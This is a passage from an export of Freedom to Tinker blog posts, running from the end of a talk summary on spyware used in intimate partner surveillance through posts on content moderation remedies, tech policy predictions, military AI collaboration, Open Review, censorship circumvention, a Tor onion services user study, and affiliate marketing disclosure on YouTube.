belong to the abuser but survivors are rarely able to prove it. When abusers send hurtful, abusive messages, someone who lacks the content may not be able to detect it. Outside of the context of IPV, a picture of a gun might be just a picture of a gun- but in context, it can be very threatening. Common Advice Also Fails Victims Much of the common advice just won’t work. Sometimes people are urged to delete their account. You can’t just shut off contact with an abuser- you might be legally obligated to communicate (shared custody of children). You can’t get new devices because the abuser pays for phones, family plan, and/or children’s devices (which is a vector of surveillance). People can’t necessarily get off social media, because they need it to get access to their friends and family. On top of that, any of these actions could escalate abuse; victims are very worried about cutting off access or uninstalling spyware because they’re worried about further violence from the abuser. Many Makers of Spyware Promote their Software for Intimate Partner Surveillance Next, Thomas tells us about intimate partner surveillance (IPS) from a new paper led by Diana Freed on How Intimate Partner Abusers Exploit Technology. Shelters and family justice centers have had problems where someone shows up with software on their phone that allowed the abuser to track them, kick down a door, and endanger the victim. No one could name a single product that was used by abusers, partly because our ability to diagnose spyware from a technical perspective is limited. On the other hand, if you google “track my girlfriend,” you will find a host of companies that are peddling spyware. To study the range of spyware systems, Thomas and his colleagues used “snowball” searching and used auto-complete to look for other queries that other people were searching. From a set of roughly 27k urls, they investigated 100 randomly sampled URLs. They found that 60% were related to intimate partner surveillance: how-to blogs, Q&A forums, news articles, app websites, and links to apps on the Google Play Store and the Apple App Store. Many of the professional-grade spyware providers provide apps directly through app stores, as well as “off-store” apps. They labeled a thousand of the apps they found and discovered that about 28% of them were potential IPS tools. The researchers found overt tools for intimate partner surveillance apps, as well as systems for safety, theft-tracking, child tracking, and employee tracking that were repurposed for abuse. In many cases, it’s hard to point to a single piece of software and say that it’s bad. While apps sometimes purport to provide services to parents to track children, searches for intimate partner violence also surface paid ads to products that don’t directly claim to be for use within intimate partners. Ever since a ruling from the FTC, companies work to preserve plausible deniability. In an audit study the researchers emailed customer support for 11 apps (on-store and off-store) posing as an abuser. They received nine responses. Eight of them condoned intimate partner violence and gave them advice on making the app hard to find. Only one indicated that it could be illegal. Many of these systems have rich capabilities: location tracking, texts, call recordings, media contents, app usage, internet activity logs, keylogging, geographic tracking. All of the off-store systems have covert features to hide the fact that the app is installed. Even some of the Google Play Store apps have features to make the apps covert. Early Steps for Supporting Victims: Detecting Spyware What’s the current state of the art? Right now, practitioners tell people that if your battery runs unusually low, they may be a victim of spyware– not very effective. Do spyware removal tools work? They had high but not perfect detection rates for off-store intimate-purpose surveillance systems. However they did a poor job at detecting on-store spyware tools. Thomas recaps what they learned from this study: There’s a large ecosystem of spyware apps, the dual use of these apps creates a significant challenge, many developers are condoning intimate partner surveillance, and existing anti-spyware technologies are insufficient at detecting tools. Based on this work, Thomas and his collaborators are working with the NYC Mayor’s office and the National Network to end Domestic Violence to develop ways to detect spyware, to develop new surveys of technology risks, and find new kinds of interventions. Thomas concludes with an appeal to companies and computer scientists that we pay more attention to the needs of the most vulnerable people affected by our work, volunteer for organizations that support victims, and develop new approaches to protect people in these all-too-common situations."
"65","2019-05-07","2023-03-24","https://freedom-to-tinker.com/2019/05/07/choosing-between-content-moderation-interventions/","How can we design remedies for content “violations” online? Speaking today at CITP is Eric Goldman (@ericgoldman), a professor of law and co-director of the High Tech Law Institute, at Santa Clara University School of Law. Before he became a full-time academic in 2002, Eric practiced Internet law for eight years in the Silicon Valley. His research and teaching focuses on Internet, IP and advertising law topics, and he blogs on these topics at the Technology & Marketing Law Blog. Eric reminds us that content moderation questions are front page stories every week. Lawmakers and tech companies are wondering how to create a world where everyone can have their say, people have a chance to hear from them, and people are protected from harms. Decisions about content moderation depend on a set of questions, says Eric: “What rules govern online content?” “Who creates those rules? Who adjudicates rule violations?” Eric is most interested in a final question: “what consequences are imposed for rule violations? So what do should we do once a content violation has been observed? The traditional view is to delete the content or account or to keep the content and account. For example, under the Digital Millennium Copyright Act, platforms are required to “remove or disable access to” copyrighted material. It allows no option less than removing the material from visibility. The DMCA also specifies two other remedies: terminating “repeat infringers” and issue subpoenas to identify/unmask alleged infringers. Overall however, the primary intervention is to remove things, and there’s no lesser action Next Eric, tells us about civil society principles that adopt a similar idea of removal as the primary remedy. For example, the Manila Principles on Intermediary Liability assume that removal is the one available intervention, but that it should be necessary, proportional, and adopt “the least restrictive technical means.” Similarly, the Santa Clara Principles assume that removal is the one available option. Eric reminds us that there are many remedies between removal and keeping content. Why should we pay attention to them? With a wider range of options, we can (a) avoid collateral damage from overbroad remedies and develop a (b) broader remedy toolkit to match the needs of different communities. With a wider palette of options, we would also need principles for choosing between those remedies. Eric wants to be able to suggest options that regulators or platforms have at their disposal when making policy decisions. To illustrate the value of being able to differentiate between remedies, Eric talks about communities that have rich sets of rules with a range of consequences other than full approval or removal, such as churches, fraternities, and sports leagues. Eric then offers us a taxonomy of remedies, drawn from examples in use online: (a) content restrictions, (b) account restrictions, (c) visibility reductions, (d) financial levers, and (e) other. Eric asks: once we have listed remedies, how could we possibly choose among them? Eric talks about different theories for choosing – and he doesn’t think that those models are useful for this conversation. Furthermore, conversations about government-imposed remedies are different from internet content violations. Unlike internet content policies, says Eric, government remedies: are determined by elected officials funded by taxes non-compliance is enforced by police power some remedies are only available to the government (like jail/death) are subject to constitutional limits Finally, Eric shares some early thoughts about how to choose among possible remedies: Remedy selection manifests a service’s normative priorities, which differ Possible questions to ask when choosing among remedies: How bad is the rule violation? How confident is the service that the rule was actually violated? How open is the community? How will the remedy affect other community members? How to balance between behavior conformance with user engagement? Site design can prevent violations Educate and socialize contributors (for example) Services with only binary remedies aren’t well-positioned to solve problems, and maybe other actors are in a better position Typically, private remedies are better than judicially imposed remedies, but at cost of due process Remedies should be necessary & proportionate Remedies should empower users to choose for themselves what to do"
"66","2013-01-07","2023-03-24","https://freedom-to-tinker.com/2013/01/07/predictions-for-2013/","After a year’s hiatus, our annual predictions post is back! As usual, these predictions reflect the results of brainstorming among many affiliates and friends of the blog, so you should not attribute any prediction to any individual (including me–I’m just the scribe). Without further ado, the tech policy predictions for 2013: DRM technology will still fail to prevent widespread infringement. In a related development, pigs will still fail to fly. The FAA won’t reverse the ban on using electronic devices during takeoff and landing, despite increasing political pressure to do so and a continued lack of evidence that devices are dangerous. A self-driving vehicle will be involved in a fatal accident. The victim’s family will sue everybody in sight, triggering a backlash against self-driving cars but (on the bright side) leading to more careful consideration of how the law should apply. A secret autonomous weapon system will be involved in a high-profile botched/mistaken military strike that will increase debate about autonomous weapons and the role of humans in the loop. Further investigation will show that the critical error was made by a human in the loop. Civilian versions of military UAVs, like the Predator, will gain broader approval for use in domestic airspace and will be rapidly adopted by the obvious government agencies (e.g. police departments, border patrol, USGS) as well as all manner of unexpected non-government applications (e.g. traffic reporting, aerial banner advertising). “Deconflicting” airspace will become a hot topic for discussion. A drone will be used in creepy fashion by a (civilian) stalker. An unexpected solar event, debris, or collision will take out one or more GPS satellites or other important space infrastructure, causing real problems to computer and network-dependent societies. While we’ll continue to see a smattering of settlements in the smartphone patent wars, there will be no broad industry-wide “solution” or peace, nor will there be significant legislative progress toward changing the patent system to reduce the impact of software patent thickets. Instead, expect more defensive transactions like the recent $500 million acquisition of Kodak’s patent portfolio. As the Supreme Court considers pay-for-delay patent licenses in the drug industry, more attention will be paid to potentially anticompetitive patent licensing practices in the technology industries. At least one company that offers web tracking services, e.g., third parties that can tell a web site something about who you are when you visit, will get in sufficient hot water over its behavior that Congress will hold hearings on the topic and drag the company’s executives in for a verbal drubbing. Despite this, the US will not pass signficant new legislation to govern this sort of behavior. There will be at least one new Android or IOS app that blatantly violates user expectations of privacy in comparable magnitude to Path (who silently uploaded its users’ full contact lists), leading to Google and/or Apple taking corrective actions in their app stores. Again, there will be legislative attention but no legislation passed. Wireless carriers will get into trouble because of their failure to offer system software updates for still-under-contract Android phones. Users will be burned by security or reliability problems that are fixed in newer Android versions that the carrier fails to provide. A minor scandal will erupt over a computer science research project that causes avoidable harm to users, after the researchers omitted the standard IRB human subjects review Some prominent web sites will start supporting Do Not Track and at least one major country will attach requirements for how sites must respect DNT. Despite much discussion, there will be no US mandate for DNT and many web sites will flagrantly ignore it. Ad blocking, and privacy-motivated content blocking generally, will gain more usage and legitimacy as users increasingly see blocking as the most effective way to navigate the confusing thicket of web privacy concerns. Overseas and military voters will continue to cast votes through flagrantly insecure means (e.g. email without paper backup) and there will be a push to expand these programs to domestic voters despite their obvious flaws. A popular competitive TV show, where viewers vote for their favorites through text messages and/or the web, will be rumored to have had its voting process “hacked” (or perhaps someone will take post-facto credit for such a hack). The show’s management will try to cover up or deny this, claiming that the system is totally secure when it obviously is not, leading to allegations that the show’s producers are manipulating the vote. One of the hot topics in cybersecurity this year will be the legitimacy of counter-offensive cyber-operations (i.e. hacking back at whoever is hacking you). Somebody will get in trouble and/or get sued for a botched counter-offensive operation. There will be further newsworthy incidents of data exfiltration from large industrial, government, or military enterprises. Congress will hold hearings and there will be some consternation about how government should or shouldn’t protect non-government actors from such attacks. The battle between countries that censor or control their citizen’s access to the full Internet (e.g., China with its Great Firewall) and technologies that try to work around the blockages (e.g., Tor) will continue without signficant advances on either side, but not without hype for some new “major development.” There will be a dispute over whether a CDN like CloudFlare or cloud hosting service like Amazon EC2 is providing material support for terrorists by, e.g., hosting Hamas. An online-only show will get support for an Emmy nomination, but is ruled ineligible. Massive open online courses (MOOCs) will enroll more students and there will be some consolidation in the market for MOOC platforms. Non-profit platforms will slowly gain market share, as institutions worry about the credential-granting business models that will start to proliferate on the for-profit platforms."
"67","2019-02-05","2023-03-24","https://freedom-to-tinker.com/2019/02/05/bridging-tech-military-ai-divides-in-an-era-of-tech-ethics-sharif-calfee-at-citp/","In a time when U.S. tech employees are organizing against corporate-military collaborations on AI, how can the ethics and incentives of military, corporate, and academic research be more closely aligned on AI and lethal autonomous weapons? Speaking today at CITP was Captain Sharif Calfee, a U.S. Naval Officer who serves as a surface warfare officer. He is a graduate of the U.S. Naval Academy and U.S. Naval Postgraduate School and a current MPP student at the Woodrow Wilson School. Afloat, Sharif most recently served as the commanding officer, USS McCAMPBELL (DDG 85), an Aegis guided missile destroyer. Ashore, Sharif was most recently selected for the Federal Executive Fellowship program and served as the U.S. Navy fellow to the Center for Strategic & Budgetary Assessments (CSBA), a non-partisan, national security policy analysis think-tank in Washington, D.C.. Sharif spoke to CITP today with some of his own views (not speaking for the U.S. government) about how research and defense can more closely collaborate on AI. Over the last two years, Sharif has been working on ways for the Navy to accelerate AI and adopt commercial systems to get more unmanned systems into the fleet. Toward this goal, he recently interviewed 160 people at 50 organizations. His talk today is based on that research. Sharif next tells us about a rift between the U.S. government and companies/academia in AI. This rift is a symptom, he tells us, of a growing “civil-military divide” in the US. In previous generations, big tech companies have worked closely with the U.S. military, and a majority of elected representatives in Congress had prior military experience. That’s no longer true. As there’s a bifurcation in the experiences of Americans who serve in the military versus those who have. This lack of familiarity, he says, complicates moments when companies and academics discuss the potential of working with and for the U.S. military. Next, Sharif says that conversations about tech ethics in the technology industry are creating a conflict that making it difficult for the U.S. military to work with them. He tells us about Project Maven, a project that Google and the Department of Defense worked on together to analyze drone footage using AI. Their purpose was to reduce the number of casualties to civilians who are not considered battlefield combatants. This project, which wasn’t secret, burst into public awareness after a New York Times article and a letter from over three thousand employees. Google declined to renew the DOD contract and update their motto. U.S. Predator Drone (via Wikimedia Commons) On the heels of their project Maven decision, Google also faced criticism for working with the Chinese government to provide services in China in ways that enabled certain kinds of censorship. Suddenly, Google found themselves answering questions about why they were collaborating with China on AI and not with the U.S. military. How do we resolve this impasse in collaboration? The defense acquisition process is hard for small, nimble companies to engage in Defense contracts are too slow, too expensive, too bureaucratic, and not profitable Companies aren’t not necessarily interested in the same type of R&D products as the DOD wants National security partnerships with gov’t might affect opportunities in other international markets. The Cold War is “ancient history” for the current generation Global, international corporations don’t want to take sides on conflicts Companies and employees seek to create good. Government R&D may conflict with that ethos Academics also have reasons not to work for the government: Worried about how their R&D will be utilized Schools of faculty may philoisophically disagree with the government Universities are incubators of international talent, and government R&D could be divisive, not inclusive Government R&D is sometimes kept secret, which hurts academic careers Faced with this, according to Sharif, the U.S. government is sometimes baffled by people’s ideological concerns. Many in the government remember the Cold War and knew people who lived and fought in World War Two. They can sometimes be resentful about a cold shoulder from academics and companies, especially since the military funded the foundational work in computer science and AI. Sharif tells us that R&D reached an inflection point in the 1990s. During the Cold War, new technologies were developed through defense funding (the internet, GPS, nuclear technology) and then they reached industry. Now the reverse happens. Now technologies like AI are being developed by the commercial sector and reaching government. That flow is not very nimble. DOD acquisition systems are designed for projects that take 91 months to complete (like a new airplane), while companies adopt AI technologies in 6-9 months (see this report by the Congressional Research Service). Conversations about policy and law also constrain the U.S. government from developing and adopting lethal autonomous weapons systems, says Sharif. Even as we have important questions about the ethical risks of AI, Sharif tells us that other governments don’t have the same restrictions. He asks us to imagine what would have happened if nuclear weapons weren’t developed first by the U.S.. How can divides between the U.S. government and companies/academia be bridged? Sharif suggests: The U.S. government must substantially increase R&D funding to help regain influence Establish a prestigious DOD/Government R&D one-year fellowship program with top notch STEM grads prior to joining the commercial sector Expand on the Defense Innovation Unit Elevate the Defense Innovation Board in prominence and expand the project to create conversations that bridge between ideological divides. Organize conversations at high levels and middle management levels to accelerate this familiarization. Increase DARPA and other collaborations with commercial and academic sectors Establish joint DOD and Commercial Sector exchange programs Expand the number of DOD research fellows and scientists present on university campuses in fellowship programs Continue to reform DOD acquisition processes to streamline for sectors like AI Sharif has also recommended to the U.S. Navy that they create an Autonomy Project Office to enable the Navy to better leverage R&D. The U.S. Navy has used structures like this for previous technology transformations on nuclear propulsion, the Polaris submarine missiles, naval aviation, and the Aegis combat system. At the end of the day, says Sharif, what happens in a conflict where the U.S. does not have the technological overmatch and is overmatched by someone else? What are the real life consequences? That’s what’s at stake in collaborations between researchers, companies, and the U.S. department of defense."
"68","2013-10-08","2023-03-24","https://freedom-to-tinker.com/2013/10/08/a-start-up-born-at-citp/","As is probably the case with many start-ups, Gloobe was born late at night. Early in 2013, on the night of a snowstorm in Princeton, I presented at the student-led Code at Night hackathon an idea for a web site that organized civic information onto online maps of local communities. With experience as a former elected representative of a relatively small community within Washington, DC, I understood the value of easing the availability of information about voting, upcoming community meetings, and regulatory agency actions, but lacked the coding skills to bring the project to life. Jian Min Sim, a student from Oxford who was spending his senior year at Princeton as part of an exchange program, heard about my presentation from a friend and when we got together, pulled out his laptop and said, “I have already built something very similar.” After winning a contest sponsored by the ITU, Jian had built a mapping website designed to provide a platform for NGO employees and others who travel frequently to share information about places that lacked detailed on-line limited maps. A partnership formed. Over the course of the year, we have talked repeatedly about different ways of using technology to reach different groups of people – young people, people working for the government, in education, or at large corporations – who are looking to share knowledge more effectively. Through all of these conversations, we have sought to figure out what we think is important – a preference for wireless solutions, a simple platform, providing real-time access to information about what’s happening in local communities. Do we think our mission is best served as a for-profit or non-profit entity? Early this summer, we had a productive meeting with Tigerlabs in Princeton discussing whether our civic information-mapping site was a good fit for their incubator program. Ultimately, it was not. However, we had a great conversation about the market for investments in start-ups in the local and hyper-local space: It has proven to be one of the most difficult for entrepreneurs to crack. Groupon, for example, had a great run of success, but has struggled to maintain that momentum. Informed by our conversation with Tigerlabs and in light of our desire to make a product that will appeal to both people who don’t realize just yet how engaged they are in their local communities and community activists, we are developing a mobile app that will allow people to make more efficient use of the commercial and public spaces in their communities. We attended the MobileBeat 2013 conference in San Francisco in July and had some great preliminary meetings with IBM, SingTel – a Singaporean telecommunications company with over 400 million mobile customers – and others. We are still working to improve the app and plan an initial a test phase in Singapore when it’s app store ready. We will move forward thinking about how to help people connect and share knowledge to make their lives and local communities better. It’s going to be smart citizens that make smart cities."
"69","2016-10-05","2023-03-24","https://freedom-to-tinker.com/2016/10/05/open-review-leads-to-better-books/","My book manuscript, Bit by Bit: Social Research in the Digital Age, is now in Open Review. That means that while the book manuscript goes through traditional peer review, I also posted it online for a parallel Open Review. During the Open Review everyone—not just traditional peer reviewers—can read the manuscript and help make it better. Schematic of Open Review. Screenshot of Open Review interface. Click for full size. I think that the Open Review process will lead to better books, higher sales, and increased access to knowledge. In this blog post, I’d like to describe the feedback that I’ve received during the first month of Open Review and what I’ve learned from the process. First a bit of background, Bit by Bit: Social Research in the Digital Age is a book for social scientists who want to do more data science, data scientists who want to do more social science, and anyone interested in the future of social research. Here’s how the preface begins: “For me, this book began in 2005, when I was working on my dissertation. I was running an online experiment, which I’ll tell you all about in Chapter 4, but now I’m going to tell you something that is not in any academic paper. And, it’s something that fundamentally changed how I think about research. One morning, when I checked the web-server, I discovered that overnight about 100 people from Brazil had participated in my experiment. This experience had a profound impact on me. At that time, I had friends who were running traditional lab experiments, and I knew how hard they had to work to recruit, supervise, and pay people to participate in their experiments; if they could run 10 people in a single day, that was good progress. But, with my online experiment, 100 people participated while I was sleeping. Doing your research while you are sleeping might sound too good to be true, but it isn’t. Changes in technology—specifically the transition from the analog age to the digital age—mean that we can now collect and analyze social data in new ways. This book is about doing social research in these new ways.” When I submitted the manuscript to Princeton University Press for peer review, I also created an Open Review website and posted the entire manuscript online (in a later post, I’ll write more about the build process for the website). One of the reasons that I was so excited about the Open Review website is that it offered me a chance to get feedback from people with different perspectives and intellectual backgrounds. And, I have not been disappointed. So far I’ve received more than 100 annotations from about 10 people. In a future post, I’ll do a more quantitative analysis of the feedback, but in this post I’d like to offer some more general impressions. First, and most importantly, this feedback has lead to changes that definitely improved the manuscript. The annotations have identified a number of typos and grammatical errors. But, more important than that, the annotations have identified parts of the text that readers found confusing, unconvincing, or exciting. Further, a couple of annotations have pointed me to interesting papers that I had not seen. Thus, so far, the feedback has led to changes that are evolutionary not revolutionary. But, many incremental improvements results in a noticeably clearer, crisper book. During this month I’ve also learned that the Open Review process itself can be improved. I think the biggest challenge is encouraging readers to offer more complex—and therefore more valuable—feedback. Feedback about typos is helpful, but the book will eventually have a copy editor who should catch these. Therefore, I’d prefer for readers to focus their feedback on more intellectual aspects of the book. I think that part of the problem is that I didn’t do a great job of setting expectations for what Open Review is about and so people thought that it was about typos. Let me be clear: Open Review is not about typos. In order to address this problem, I’ve updated the page where I explain Open Review. Eventually, the norms for this process will become more standardized, and future authors should not have as much difficulty trying to explain the process or set expectations. I’d like to end this post by answering a number of questions that people have asked me about Open Review. Who are the people giving feedback? I would like to thank the people who have offered helpful feedback during the Open Review process: jeschonnek.1, Nick_Adams, DBLarremore, Nicolemarwell, dmf, cc23, efosse, cfelton, jboy, and jugander. Also, I would like to thank Arvind Narayanan, Betsy Paluck, Chico Bastos, Nick Feamster, and Don Dillman for sending me feedback through email (feedback that was generated by the Open Review process but which is not visible to everyone). The people offering feedback are a wonderful mix. Some are undergraduates; some are postdocs; and some are professors. Some are social scientists; some are data scientists; and some are computational social scientists. Some live in the US and some live in Europe. And, my guess is that none of them would have been asked by my publisher (Princeton University Press) to do a peer review. In other words, Open Review collects feedback that would not come through traditional peer review. Can I see the annotations? Yes, everyone can see them. There are two main ways to see them. First, you can see them on the right side of the page on the Open Review website. And, you can see a stream of annotations from the hypothes.is website. Why are you letting these people write your book? I am not letting these people write my book. I promise to read and think about all the feedback received during Open Review, but I won’t make all the changes suggested by the participants. This book represent my view; it is not a wiki book. At this point, I think I’ve made changes based on about half of the annotations. How did you get brave enough to do Open Review? I see it totally differently. To me, bravery is writing a book and then having it published without getting feedback from as many people as possible. Can Open Review replace peer review? I don’t think so. Open Review—at least so far—seems to lead to short comments on small chunks of the text. I expect that peer review will lead to longer comments on the entire arc and argument of the book. These are two different—and complementary—things. Also, peer review helps the publisher assess the quality of the text in a way that Open Review does not. How long will Open Review last? Basically as long as peer review lasts, which I expect to be a few months. Open Review ends ends when I submit my final manuscript to my publisher. How do manage all of the feedback? We’re using hypothes.is, an amazing open source annotation system. Can I participate in Open Review? Yes. Please visit http://www.bitbybitbook.com and start annotating. Can I put my book into Open Review? Yes. In fact, we are about to make an announcement that should make it much easier for everyone to put their book into Open Review."
"70","2013-05-02","2023-03-24","https://freedom-to-tinker.com/2013/05/02/collateral-freedom-in-china/","OpenITP has just released a new report—Collateral Freedom—that studies the state of censorship circumvention tool usage in China today. From the report’s overview: This report documents the experiences of 1,175 Chinese Internet users who are circumventing their country’s Internet censorship—and it carries a powerful message for developers and funders of censorship circumvention tools. We believe these results show an opportunity for the circumvention tech community to build stable, long term improvements in Internet freedom in China. The circumvention tools that work best for these users are technologically diverse, but they are united by a shared political feature: the collateral cost of choosing to block them is prohibitive for China’s censors. Our survey respondents are relying not on tools that the Great Firewall can’t block, but rather on tools that the Chinese government does not want the Firewall to block. Internet freedom for these users is collateral freedom, built on technologies and platforms that the regime ﬁnds economically or politically indispensable. Download the full report here: http://openitp.org/?q=node/44 The study was conducted by CITP alums David Robinson and me, along with Anne An. It was managed by OpenITP, and supported by Radio Free Asia’s Open Technology Fund. We wrote it primarily for developers and funders of censorship circumvention technology projects, but it is also designed to be accessible for non-technical policymakers who are interested in Internet freedom, and for China specialists without technology background."
"71","2018-07-12","2023-03-24","https://freedom-to-tinker.com/2018/07/12/demystifying-the-dark-web-peeling-back-the-layers-of-tors-onion-services/","by Philipp Winter, Annie Edmundson, Laura Roberts, Agnieskza Dutkowska-Żuk, Marshini Chetty, and Nick Feamster Want to find US military drone data leaks online? Frolick in a fraudster’s paradise for people’s personal information? Or crawl through the criminal underbelly of the Internet? These are the images that come to most when they think of the dark web and a quick google search for “dark web” will yield many stories like these. Yet, far less is said about how the dark web can actually enhance user privacy or overcome censorship by enabling anonymous browsing through Tor. Recently, for example, Brave, dedicated to protecting user privacy, integrated Tor support to help users surf the web anonymously from a regular browser. This raises questions such as: is the dark web for illicit content and dealings only? Can it really be useful for day-to-day web privacy protection? And how easy is it to use anonymous browsing and dark web or “onion” sites in the first place? To answer some of these pressing questions, we studied how Tor users use onion services. Our work will be presented at the upcoming USENIX Security conference in Baltimore next month and you can read the full paper here or the TLDR version here. What are onion services?: Onion services were created by the Tor project in 2004. They not only offer privacy protection for individuals browsing the web but also allow web servers, and thus websites themselves, to be anonymous. This means that any “onion site” or dark web site cannot be physically traced to identify those running the site or where the site is hosted. Onion services differ from conventional web services in four ways. First, they can only be accessed over the Tor network. Second, onion domains, (akin to URLs for the regular web), are hashes over their public key and consist of a string of letters and numbers, which make them long, complicated, and difficult to remember. These domains sometimes contain prefixes that are human-readable but they are expensive to generate (e.g. torprojectqyqhjn.onion). We refer to these as vanity domains. Third, the network path between the client and the onion service is typically longer, meaning slower performance owing to longer latencies. Finally, onion services are private by default, meaning that to find and use an onion site, a user has to know the onion domain, presumably by finding this information organically, rather than with a search engine. What did we do to investigate how Tor users make use of onion services?: We conducted a large scale survey of 517 Tor users and interviewed 17 Tor users in depth to determine how users perceive, use, and manage onion services and what challenges they face in using these services. We asked our participants about how they used Tor’s onion services and how they managed onion domains. In addition, we asked users about their expectations of privacy and their privacy and security concerns when using onion services. To compliment our qualitative data, we analyzed “leaked” DNS lookups to onion domains, as seen from a DNS root server. This data gave us insights into actual usage patterns to corroborate some of the findings from the interviews and surveys. Our final sample of participants were young, highly educated, and comprised of journalists, whistleblowers, everyday users wanting to protect their privacy to those doing competitive research on others and wanting to avoid being “outed”. Other participants included activists and those who wanted to avoid government detection for fear of persecution or worse. What were the main findings? First, unsurprisingly, onion services were mostly used for anonymity and security reasons. For instance, 71% of survey respondents reported using onion services to protect their identity online. Almost two thirds of the survey respondents reported using onion services for non-browsing activities such as TorChat, a secure messaging app built on top of onion services. 45% of survey participants had other reasons for using Tor such as to help educate users about the dark web or for their personal blogs. Only 27% of survey respondents reported using onion services to explore the dark web and its content “out of curiosity”. Second, users had a difficult time finding, tracking, and saving onion links. Finding links: Almost half of our survey respondents discovered onion links through social media such as Twitter or Reddit or by randomly encountering links while browsing the regular web. Fewer survey respondents discovered links through friends and family. Challenges users mentioned for finding onion services included: Onion sites frequently change addresses and so often onion domain aggregators have broken and out of date links. Unlike traditional URLS, onion links give no indication of the content of the website so it is difficult to avoid potentially offensive or illicit content. Again, unlike traditional URLS, participants said it is hard to determine through a glance at the address bar if a site is the authentic one you are trying to reach instead of a phishing site. A frequent wish expressed by participants was for a better search engine that is more up to date and gives an indication of the content before one clicks on the link as well as authenticity of the site itself. Tracking and Saving links: To track and save complicated onion domains, many participants opted to bookmark links but some did not want to leave a trace of websites they visited on their machines. The majority of other survey respondents had ad-hoc measures to deal with onion links. Some memorized a few links and did so to protect privacy by not writing the links down. However, this was only possible for a few vanity domains in most cases. Others just navigated to the places where they found the links in the first place and used the links from there to open the websites they needed. Third, onion domains are also hard to verify as authentic. Vanity domains: Users appreciated vanity domains where onion services operators have taken extra effort and expense to set up a domain that is almost readable such as the case of Facebook’s onion site, facebookcorewwwi.onion. Many participants liked the fact that vanity domains give more indication of the content of the domain. However, our participants also felt vanity domains could lead to more phishing attacks since people would not try to verify the entire onion domain but only the readable prefix. “We also get false expectations of security from such domains. Somebody can generate another onion key with same facebookcorewwwi address. It’s hard but may be possible. People who believe in uniqueness of generated characters, will be caught and impersonated.” – Participant S494 Verification Strategies: Our participants had a variety of strategies such as cutting and pasting links, using bookmarks, or verifying the address in the address bar to check the authenticity of a website. Some checked for a valid HTTPS certificate or familiar images in the website. However, a over a quarter of our survey respondents reported that they could not tell if a site was authentic (28%) and 10% did not even check for authenticity at all. Some lamented this is innate to the design of onion services and that there is not real way to tell if an onion service is authentic epitomized by a quote from Participant P1: “I wouldn’t know how to do that, no. Isn’t that the whole point of onion services? That people can run anonymous things without being able to find out who owns and operates them?” Fourth, onion lookups suggest typos or phishing. In our DNS dataset, we found similarities between frequently visited popular onion sites such as Facebook’s onion domain and similar significantly less frequently visited websites, suggesting users were making typos or potentially that phishing sites exist. Of the top 20 onion domains we encountered in our data set, 16 were significantly similar to at least one other onion domain in the data set. More details are available in the paper. What do these findings mean for Tor and onion services? Tor and onion services do have a part to play in helping users to protect their anonymity and privacy for reasons other than those usually associated with a “nefarious” dark web such as support for those overcoming censorship, stalking, and exposing others’ wrong-doing or whistleblowing. However, to better support these uses of Tor and onion services, our users wanted onion service improvements. Desired improvements included more support for Tor in general in browsers, improvement in performance, improved privacy and security, educational resources on how to use Tor and onion services, and finally improved onion services search engines. Our results suggest that to enable more users to make use of onion services, users need: better security indicators to help them understand Tor and onion services are working correctly automatic detection of phishing in onion services opt in publishing of onion domains to improve search for legitimate and legal content better ways to track and save onion links including privacy preserving onion bookmarking. Future studies to further demystify the dark web are warranted and in our paper we make suggestions for more work to understand the positive aspects of the dark web and how to support privacy protections for everyday users. You can read more about our study and its limitations here (such as the fact our participants were self-selected and may not represent those who do use the dark web for illicit activities for instance) or skim the paper summary."
"72","2019-07-09","2023-03-24","https://freedom-to-tinker.com/2019/07/09/is-this-an-ad-help-us-identify-misleading-content-on-youtube/","by Michael Swart, Arunesh Mathur, and Marshini Chetty Ever watched a video on YouTube and wondered if the YouTuber was paid for endorsing a product? You are not alone. In fact, Senator Blumenthal of Connecticut recently called for the Federal Trade Commission (FTC) to look into deceptive practices where YouTubers do not disclose that they are being paid to market detoxifying teas. According to current regulations, anytime a social media influencer is paid by a company to endorse their product, the FTC requires that the influencer explicitly disclose to his or her followers that they have partnered with the brand. However, in practice, influencers often fail to include such a disclosure. As we describe in a previous post, only about 1 out of every 10 YouTube videos that contain a type of endorsement called affiliate marketing (usually including marketing links to products in the video description) actually discloses that a relationship existed between the content creator and a brand. This is problematic because in videos without disclosures, users do not know that the influencer’s endorsement of the product is unauthentic and that they were incentivized to give a positive review. To address this issue, we built a Google Chrome Extension called AdIntuition that combats these deceptive marketing practices. The extension automatically detects and discloses whether a YouTube video contains affiliate marketing links in the video description. Our goal is to help inform users of a relationship between an influencer and a brand on YouTube. What can you do to help?: In order to further improve the extension, we need data on how users make use of it in their everyday lives. You can help us achieve this goal by downloading the extension here and reading about our study here. We have a version for Firefox and Chrome. Then, as you watch YouTube videos, you will be notified of affiliate marketing content. For research purposes such as to improve the tool design, our detection algorithms, and to determine the best way to help people identify ads online, we will collect data in the tool about how often you encounter affiliate marketing content. (Full details on data collection here). This will help us further our understanding of how to create tools to keep users informed online! You could also consider participating in a more in depth study – details here. How we built AdIntuition: Building on our previous work, we look for the presence of affiliate marketing links in any level of the redirect chain that can be present in a YouTube video description. We also highlight Urchin Tracking Module parameters which are correlated with tracking links. Finally, we built a classifier that identifies the presence of coupon codes in YouTube descriptions, which are used to track users in an online shop."
"73","2018-03-26","2023-03-24","https://freedom-to-tinker.com/2018/03/26/is-affiliate-marketing-disclosed-to-consumers-on-social-media/","By Arunesh Mathur, Arvind Narayanan and Marshini Chetty YouTube has millions of videos similar in spirit to this one: The video reviews Blue Apron—an online grocery service—describing how it is efficient and cheaper than buying groceries at the store. The description of the video has a link to Blue Apron which gets you a $30 off your first order, a seemingly sweet offer. The video’s description contains an affiliate link (marked in red). What you might miss, though, is that the link in question is an “affiliate” link. Clicking on it takes you through five redirects courtesy of Impact—an affiliate marketing company—which tracks the subsequent sale and provide a kickback to the YouTuber, in this case Melea Johnson. YouTubers use affiliate marketing to monetize their channels and support their activities. This example is not unique to YouTube or affiliate marketing. There are several marketing strategies that YouTubers, Instagrammers, and other content creators on social media (called influencers in marketing-speak) engage in to generate revenue: affiliate marketing, paid product placements, product giveaways, and social media contests. Endorsement-based marketing is regulated. In the United States, the Federal Trade Commission requires that these endorsement-based marketing strategies be disclosed to end-users so they can give appropriate weightage to content creators’ endorsements. In 2017 alone, the FTC sent cease and desist letters to Instagram celebrities who were partnering with brands and reprimanded YouTubers with gaming channels who were endorsing gambling companies—all without appropriate disclosure. The need to ensure content creators disclose will likely become all the more important as advertisers and brands attempt to target consumers on consumers’ existing social networks, and as lack of disclosure causes harm to end-users. Our research. In a paper that is set to appear at the 2018 IEEE Workshop on Consumer Protection in May, we conducted a study to better understand how content creators on social media disclose their relationships with advertisers to end-users. Specifically, we examined affiliate marketing 